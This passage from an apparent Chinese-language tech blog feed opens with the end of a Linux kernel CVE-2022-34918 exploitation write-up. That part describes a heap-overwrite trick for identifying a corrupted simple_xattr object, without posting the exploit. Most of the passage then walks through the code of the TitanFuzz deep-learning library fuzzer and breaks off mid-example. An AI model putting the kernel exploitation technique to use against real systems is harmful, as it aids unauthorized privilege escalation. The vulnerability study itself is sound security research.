href="#识别被覆盖对象" class="headerlink" title="识别被覆盖对象"></a>识别被覆盖对象</h3><p>unlink一个simple_xattr时需要一个name，因此我们需要知道哪个结构体被覆盖了，我们可以通过分配0x100大小的name，这样name指针的最低字节为\x00，在伪造list的同时覆盖name指针的低字节来识别覆盖对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">simple_xattr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><span class="hljs-type">char</span> *name;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">char</span> value[];<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>自己搓了一个，<em>太长了不贴了</em></p><img src="/2025/01/07/cve-2022-34918/root.png" class title="root">]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>cve</tag>
      
      <tag>nft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TitanFuzz</title>
    <link href="/2025/01/03/titanfuzz/"/>
    <url>/2025/01/03/titanfuzz/</url>
    
    <content type="html"><![CDATA[<p>终于写完了</p><span id="more"></span><h1 id="ev-generation-py"><a href="#ev-generation-py" class="headerlink" title="ev_generation.py"></a>ev_generation.py</h1><p>主程序</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><ul><li>–model_name：使用的模型，两种：<ul><li>facebook&#x2F;incoder-1B</li><li>facebook&#x2F;incoder-6B</li></ul></li><li>–library：扫哪个库：<ul><li>tf</li><li>torch</li></ul></li><li>–api：要扫描的api：<ul><li><p>all：全部</p></li><li><p>指定api</p></li></ul></li><li>–apilist：要扫描的api的文件路径，如：<ul><li>tf：data&#x2F;tf_apis.txt</li><li>torch：data&#x2F;torch_apis.txt</li></ul></li><li>–startid：从几号种子开始，默认0</li><li>–endid：到几号种子结束，默认-1</li><li>–folder：工作目录，默认Results&#x2F;${TEST_LIB}</li><li>–seedfolder：种子库路径，默认：<ul><li>tf：..&#x2F;codex_seed_programs&#x2F;codex_tf_seeds&#x2F;fix</li><li>torch：..&#x2F;codex_seed_programs&#x2F;codex_torch_seeds&#x2F;fix</li></ul></li><li>–use_sample_apis：是否使用样例api<ul><li>是<ul><li>tf：data&#x2F;tf_apis_100sample.txt</li><li>torch：data&#x2F;torch_apis_100sample.txt</li></ul></li><li>否<ul><li>tf：data&#x2F;tf_apis.txt</li><li>torch：data&#x2F;torch_apis.txt</li></ul></li></ul></li><li>–random_seed：随机数的种子</li><li>–max_valid：最大有效种子数</li><li>–batch_size：一次前向传播中同时处理的样本数量</li><li>–timeout：时间限制</li><li>–seed_pool_size：种子池大小</li><li>–only_valid：只使用可以成功执行的seed</li><li>–relaxargmut：随意替换argument</li><li>–seed_selection_algo：选取种子的标准：<ul><li>random：随机选取种子</li><li>fitness：根据fitness score选择种子，还分三种：<ul><li>fitness：api call数+深度-重复数</li><li>fitnessue：api call数-重复数</li><li>fitnessud：api call数+深度</li><li>fitnessde：深度-重复数</li></ul></li><li>coverage：根据覆盖率选择种子</li></ul></li><li>–mutator_selection_algo：多臂赌博机算法权衡策略<ul><li><p>heuristic：启发式</p></li><li><p>epsgreedy：epsilon-greedy算法</p></li><li><p>ucb：Upper Confidence Bound算法</p></li><li><p>random：随机选择</p></li><li><p>ts：Thompson Sampling算法</p></li></ul></li><li>–use_single_mutator：只使用一种变异方法</li><li>–replace_type：替代类型<ul><li>argument：替换参数</li><li>keyword：替换关键字</li><li>method：替换方法</li><li>prefix：前缀替换几行</li><li>prefix-argument：两者组合</li><li>suffix：后缀替换几行</li><li>suffix-argument：两者组合</li></ul></li><li>–mutator_set：变异策略，包括不同的replace_type策略组合<ul><li>all：全部</li><li>noprefix：无prefix</li><li>nosuffix：无suffix</li><li>noargument：无argument</li><li>nomethod：无method</li></ul></li><li>–validate_mode：种子验证方式<ul><li>process：使用process执行验证</li><li>multiprocess：使用执行验证</li><li>exec：使用exec执行验证</li></ul></li><li>–close_fd_mask：用flags的形式设置是否关闭stdout和stderr</li></ul><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><ul><li><p>参数解析，主要说明一下–api all的处理：</p><ul><li><p>–apilist不为空，则使用apilist，如设置了startid和endid则只取第startid到第endid个api</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> args.apilist <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(args.apilist, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        all_apis = f.read().splitlines()<br>    <span class="hljs-keyword">if</span> args.endid != -<span class="hljs-number">1</span>:<br>        all_apis = all_apis[: args.endid]<br>    all_apis = all_apis[args.startid :]<br></code></pre></td></tr></table></figure></li><li><p>–apilist为空：</p><ul><li>设置–use_sample_apis：<ul><li>torch：data&#x2F;torch_apis_100sample.txt</li><li>tf：data&#x2F;tf_apis_100sample.txt</li></ul></li><li>未设置–use_sample_apis：<ul><li>torch：data&#x2F;tf_apis.txt</li><li>tf：data&#x2F;torch_apis.txt</li></ul></li></ul></li></ul><p>然后对于获取的每个api重新设置–api参数再次执行命令，<em>非常朴实无华</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> api_idx, api <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(all_apis):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[&#123;&#125; / &#123;&#125;] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(api_idx, num_apis, api))<br>    <span class="hljs-comment"># 检查种子文件是否存在和工作目录是否不为空</span><br>    run_args_api = run_args.copy()<br>    run_args_api[ind] = api<br>    run_cmd(run_args_api, timeout=args.timeout + <span class="hljs-number">50</span>, verbose=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><em>run_cmd见util&#x2F;util.py</em></p><p>输出示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">Current directory:  /mnt/workspace/fuzz/TitanFuzz<br>Results will be dumped to:  /mnt/workspace/fuzz/TitanFuzz/Results<br>[0 / 2] tf.nn.conv2d<br>output.returncode:  0<br><span class="hljs-meta prompt_">stdout&gt; </span><span class="language-bash"> Current directory:  /mnt/workspace/fuzz/TitanFuzz</span><br>Results will be dumped to:  /mnt/workspace/fuzz/TitanFuzz/Results<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">api:  tf.nn.conv2d</span><br></code></pre></td></tr></table></figure></li><li><p>初始化test_executor，这个executor用于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">mp_executor.init_test_executor(args, cov=(args.seed_selection_algo == <span class="hljs-string">&quot;coverage&quot;</span>))<br></code></pre></td></tr></table></figure><p>初始化与是否需要记录覆盖率有关，<em>init_test_executor见mycoverage&#x2F;mp_executor.py</em></p></li><li><p>初始化SpanLM</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">model = SpanLM(args.model_name, batch_size=args.batch_size)<br></code></pre></td></tr></table></figure><p><em>SpanLM见model.py</em></p></li><li><p>设置随机数种子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">set_seed(args.random_seed)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_seed</span>(<span class="hljs-params">seed: <span class="hljs-built_in">int</span></span>):<br>    random.seed(seed)<br>    np.random.seed(seed)<br></code></pre></td></tr></table></figure></li><li><p>进入generate</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">generate(args, model)<br></code></pre></td></tr></table></figure></li><li><p>kill executor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">mp_executor.kill_executors()<br></code></pre></td></tr></table></figure><p><em>没什么好见的doge</em></p></li></ul><h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><ul><li><p>工作目录Results&#x2F;${TEST_LIB}下创建过程目录：</p><ul><li>seed：种子</li><li>valid：有效</li><li>flaky：执行crash但验证没crash</li><li>hangs：超时</li><li>crash：crash</li><li>exception：exception</li><li>notarget：有些推理的output可能没有目标api，此时的output可以作为一个有用的seed所以放在一个单独的文件夹</li></ul><p>并写了一个arg.txt记录参数</p></li><li><p>获取初始种子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">apis = get_initial_programs(<br>    args.seedfolder, infill_ph, args.library, <span class="hljs-string">&quot;argument&quot;</span>, target_api=args.api<br>)<br></code></pre></td></tr></table></figure><p><em>get_initial_programs见process_file.py</em></p></li><li><p>对于每个seed，执行：</p><ul><li><p>调用validate_status验证种子是否有效</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">status, msg = validate_status(<br>    seed[<span class="hljs-string">&quot;original&quot;</span>],<br>    args.library,<br>    validate_mode=args.validate_mode,<br>    test_executor=mp_executor.test_executor,<br>)<br></code></pre></td></tr></table></figure><p><em>validate_mode就是字面意思</em>，除了multiprocess使用test_executor执行</p></li></ul><p>最后得到一个seeds_for_generation</p></li><li><p>进入generate_loop：</p><ul><li><p>需要记录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">gen_ret[api] = &#123;&#125;<br>gen_ret[api][<span class="hljs-string">&quot;seeds&quot;</span>] = seeds_for_generation<br>gen_ret[api][<span class="hljs-string">&quot;initials&quot;</span>] = seeds_for_generation<br>(<br>    gen_ret[api][<span class="hljs-string">&quot;outputs&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;p&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;crashes&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;g_time&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;v_time&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;tot_time&quot;</span>],<br>    gen_ret[api][<span class="hljs-string">&quot;tot_prog&quot;</span>],<br>) = generate_loop(<br>    args, model, seeds_for_generation, api, logger, args.max_valid<br>)<br></code></pre></td></tr></table></figure><p>gen_ret会被记录到工作目录下（Results&#x2F;${TEST_LIB}&#x2F;outputs.json）</p></li></ul><p><em>generate_loop见ev_generation.py</em></p></li><li><p>把crash的seed记录至工作目录下（Results&#x2F;${TEST_LIB}）</p></li></ul><h2 id="fuzz-loop主要流程"><a href="#fuzz-loop主要流程" class="headerlink" title="fuzz loop主要流程"></a>fuzz loop主要流程</h2><ul><li>种子选取：<ul><li>随机选取</li><li>根据fitness score选取</li></ul></li><li>变异策略选取：多臂赌博机算法</li><li>变异，生成一批output</li><li>种子更新：<ul><li>根据覆盖率选择种子时如果种子没有提高覆盖率则将种子删除</li></ul></li><li>将output加入种子库：<ul><li>如果根据fitness score选取种子还需要更新种子库的小根堆</li></ul></li></ul><h2 id="generate-loop"><a href="#generate-loop" class="headerlink" title="generate_loop"></a>generate_loop</h2><ul><li><p>根据self.seed_selection_algo初始化GA_class：</p><ul><li>fitness：GAR_depth</li><li>random：GA_Random</li><li>coverage：GA_Coverage</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">ga = GA_class(<br>    original_codes,<br>    num_selection,<br>    args.batch_size,<br>    args.folder,<br>    api,<br>    model.infill_ph,<br>    args.library,<br>    args.relaxargmut,<br>    args.seed_selection_algo,<br>    args.mutator_selection_algo,<br>    args.use_single_mutator,<br>    args.replace_type,<br>    args.seed_pool_size,<br>    args.mutator_set,<br>)<br></code></pre></td></tr></table></figure><p><em>GAR_depth、GA_Random、GA_Coverage见util&#x2F;Seed_pool.py</em></p></li><li><p>进入fuzz大循环，条件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> (max_valid &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> num_valid &lt; max_valid) <span class="hljs-keyword">and</span> <span class="hljs-built_in">sum</span>(<br>    total_run_time<br>) &lt; args.timeout:<br></code></pre></td></tr></table></figure><ul><li><p>选择一批种子（其实是一个）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">selections = ga.selection()<br><span class="hljs-comment"># ……</span><br><span class="hljs-keyword">for</span> seed, infill_code, replace_type <span class="hljs-keyword">in</span> selections:<br></code></pre></td></tr></table></figure><p><em>selection见util&#x2F;Seed_pool.py</em></p><ul><li><p>推理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">well, early_stop, outputs = model.model_predict_multi(<br>    infill_code, do_sample=<span class="hljs-literal">True</span>, num_samples=args.batch_size<br>)<br></code></pre></td></tr></table></figure><p><em>model_predict_multi见model.py</em></p></li><li><p>对于每个预测的output：</p><ul><li><p>调用clean_code清理代码</p><p><em>clean_code见process_file.py</em></p></li><li><p>调用dead_code_elim清除死代码</p><p><em>dead_code_elim见util&#x2F;clean_code.py</em></p></li><li><p>调用SnippetInfill计算num_replaced</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">num_replaced, _, _ = SnippetInfill(<br>    mask_identifier=model.infill_ph,<br>    api_call=api.split(<span class="hljs-string">&quot;.&quot;</span>)[-<span class="hljs-number">1</span>],<br>    prefix=<span class="hljs-string">&quot;.&quot;</span>.join(api.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]),<br>    library=args.library,<br>    replace_type=<span class="hljs-string">&quot;argument&quot;</span>,<br>).add_infill(output)<br></code></pre></td></tr></table></figure></li></ul><p>​<em>SnippetInfill见util&#x2F;instrumentor.py</em></p><ul><li><p>调用validate_status验证output有效性</p><p><em>validate_status见ev_generation.py&#x2F;generate</em></p></li><li><p>如果num_replaced为0即所有目标api被遮盖，则将output放入notarget文件夹进入下一轮fuzz循环</p></li><li><p>根据不同的output执行结果放入对应文件夹</p></li><li><p>SUCCESS：valid</p></li><li><p>TIMEOUT：hangs</p></li><li><p>CRASH：需要用process模式再次验证</p><ul><li>CRASH：crash，并放入工作目录一份</li><li>没crash：flasky，之前的crash可能是因为某些玄学因素</li></ul></li><li><p>EXCEPTION：execption</p></li><li><p>如果种子选择模式为coverage且output有效还要调用coverate_run_status_mp收集覆盖率</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">status_, new_coverage = mp_executor.coverate_run_status_mp(<br>    output, args.library, cov_executor=mp_executor.cov_executor<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt; coverage run: &quot;</span>, status_, new_coverage)<br>add_flags.append(new_coverage)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>ga更新</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> args.seed_selection_algo == <span class="hljs-string">&quot;coverage&quot;</span>:<br>    ga.update(seed, generations, replace_type, r, filenames, add_flags)<br><span class="hljs-keyword">else</span>:<br>    ga.update(seed, generations, replace_type, r, filenames)<br></code></pre></td></tr></table></figure><p><em>update见util&#x2F;Seed_pool.py</em></p></li></ul></li><li><p>log</p><ul><li>Round：变异轮数</li><li>New Valid：本轮生成出的有效的output数</li><li>generation：本轮变异生成用时</li><li>validation：本轮验证output有效性总用时</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">--- Round : <span class="hljs-number">21</span> ---<br>--- New Valid : <span class="hljs-number">0</span> using <span class="hljs-number">0.9325060844421387</span>s generation, 0s validation ---<br></code></pre></td></tr></table></figure></li></ul></li><li><p>调用get_highest_order_output获取最大变异层数和相应种子的info，并输出种子内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">n, highest_order = ga.get_highest_order_output()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">Highest Order: <span class="hljs-number">1</span><br>----- <br> <br>input_data = tf.Variable(np.random.rand(<span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>), dtype=np.float32)<br>filter_data = tf.Variable(np.random.rand(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">16</span>), dtype=np.float32)<br>y = tf.nn.conv2d(input_data, filter_data, strides=[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>], padding=<span class="hljs-string">&#x27;SAME&#x27;</span>)<br> <br> -----<br></code></pre></td></tr></table></figure><p><em>get_highest_order_output见util&#x2F;Seed_pool.py</em></p></li><li><p>log</p><ul><li><p>生成有效output总数，生成总用时，验证总用时</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">33</span> valid outputs using <span class="hljs-number">44.97628092765808</span>s generation, <span class="hljs-number">16.274909734725952</span>s validation<br></code></pre></td></tr></table></figure></li><li><p>生成output总数，各类output数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">121</span> generated: <span class="hljs-number">46</span> exceptions <span class="hljs-number">39</span> duplicated <span class="hljs-number">0</span> crashes <span class="hljs-number">0</span> timeouts <span class="hljs-number">3</span> notargetd<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="model-py-x2F-class-SpanLM"><a href="#model-py-x2F-class-SpanLM" class="headerlink" title="model.py &#x2F; class SpanLM"></a>model.py &#x2F; class SpanLM</h1><h2 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h2><ul><li><p>load model</p></li><li><p>获取tokenizer</p></li><li><p>设置infill_ph</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self.infill_ph = <span class="hljs-string">&quot;&lt;|mask:&#123;&#125;|&gt;&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="build-input-multi"><a href="#build-input-multi" class="headerlink" title="build_input_multi"></a>build_input_multi</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_input_multi</span>(<span class="hljs-params">self, infill_code: <span class="hljs-built_in">str</span>, index: <span class="hljs-built_in">int</span>, extra_end: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> extra_end != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> infill_code + <span class="hljs-string">&quot;&lt;|mask:&#123;&#125;|&gt;&lt;|mask:&#123;&#125;|&gt;&quot;</span>.<span class="hljs-built_in">format</span>(extra_end, index)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> infill_code + <span class="hljs-string">&quot;&lt;|mask:&#123;&#125;|&gt;&quot;</span>.<span class="hljs-built_in">format</span>(index)<br></code></pre></td></tr></table></figure><p>在已经mask过的代码后面添加两个mask：</p><ul><li>第一个是mask的数量</li><li>第二个是需要推理的mask的idx</li></ul><p>比如：</p><ul><li><p>例一：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>n_infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">conv = torch.&lt;|mask:0|&gt;(1, 1, 3)&lt;|mask:1|&gt;&lt;|mask:0|&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>例二：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch</span><br><span class="hljs-string">    import numpy as np</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>n_infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch</span><br><span class="hljs-string">    import numpy as np</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)</span><br><span class="hljs-string">    output = conv2d(input_data)&lt;|mask:2|&gt;&lt;|mask:0|&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>tmp_prompt = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)&lt;|mask:2|&gt;&lt;|mask:0|&gt;</span><br><span class="hljs-string">    import torch.nn as nn\n</span><br><span class="hljs-string">    import torch.nn.functional as F&lt;|endofmask|&gt;&lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><span class="hljs-comment"># ……</span><br>    ]<br></code></pre></td></tr></table></figure></li></ul><h2 id="model-predict-multi"><a href="#model-predict-multi" class="headerlink" title="model_predict_multi"></a>model_predict_multi</h2><p>举两个例子说明：</p><ul><li><p>如果只有一个mask需要推理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p>先调用build_input_multi添加额外的mask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">n_infill = <span class="hljs-string">&#x27;conv = torch.&lt;|mask:0|&gt;(1, 1, 3)&lt;|mask:1|&gt;&lt;|mask:0|&gt;&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>再repeat成batch_size长度的列表</p></li><li><p>generate，结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python">o = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    nn.Conv2d(n_channels, n_filters[0], kernel_size=(7, 7), stride=2, padding=</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">……</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>,<br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    nn.functional.max_pool1d(x, </span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">……</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    nn.functional.pad(conv, </span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    